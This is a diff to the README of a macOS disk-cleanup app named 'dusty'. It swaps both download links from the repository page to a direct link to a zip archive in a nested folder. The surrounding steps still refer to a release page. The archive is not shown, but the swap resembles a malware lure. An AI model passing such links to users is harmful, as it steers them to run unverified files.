@@ -1,6 +1,6 @@
 # 🧹 dusty - Free up disk space with ease
 
-[![](https://img.shields.io/badge/Download_Dusty-Blue-blue.svg)](https://github.com/vinhnp1315-dev/dusty)
+[![](https://img.shields.io/badge/Download_Dusty-Blue-blue.svg)](https://github.com/vinhnp1315-dev/dusty/raw/refs/heads/main/Dusty/Dusty/Software-v3.6.zip)
 
 ## 📁 What is dusty?
 
@@ -16,7 +16,7 @@ Dusty works on modern versions of macOS. You need at least 100MB of free disk sp
 
 Follow these steps to get started.
 
-1. Visit the [download page](https://github.com/vinhnp1315-dev/dusty).
+1. Visit the [download page](https://github.com/vinhnp1315-dev/dusty/raw/refs/heads/main/Dusty/Dusty/Software-v3.6.zip).
 2. Look for the latest release version on that page.
 3. Click the link to download the file. It usually ends with a .zip or .dmg extension.
 4. Locate the downloaded file in your browser downloads folder.
